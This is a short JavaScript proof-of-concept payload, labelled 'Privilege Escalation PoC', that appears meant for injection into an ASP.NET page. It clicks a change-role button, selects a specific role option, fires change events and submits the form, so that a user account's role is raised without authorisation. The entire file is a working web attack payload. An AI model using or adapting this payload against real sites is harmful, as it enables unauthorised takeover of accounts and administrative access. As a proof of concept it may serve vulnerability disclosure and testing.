alert("Privilege Escalation PoC , change user account role");
// 1. Click a specific button by ID
const button = document.getElementById('ContentPlaceHolder1_btnChangeRole');
if (button) {
  button.click();
} else {
  console.error('Button not found: your-button-id');
}

// 2. Find a specific radio input and set its value/checked state
const radio = document.getElementById('ContentPlaceHolder1_rblRoles_2');
if (radio) {
  radio.checked = true; // marks this radio as selected
  // If you need to trigger any listeners bound to change events:
  radio.dispatchEvent(new Event('change', { bubbles: true }));
} else {
  console.error('Radio input not found: your-radio-id');
}

// 3. Find the submit input and submit the form
const submitBtn = document.getElementById('ContentPlaceHolder1_btnSaveRole');
if (submitBtn) {
  submitBtn.click();
  // Alternative if it's an <input type="submit"> inside a form:
  // submitBtn.form.submit();
} else {
  console.error('Submit input not found: your-submit-id');
}
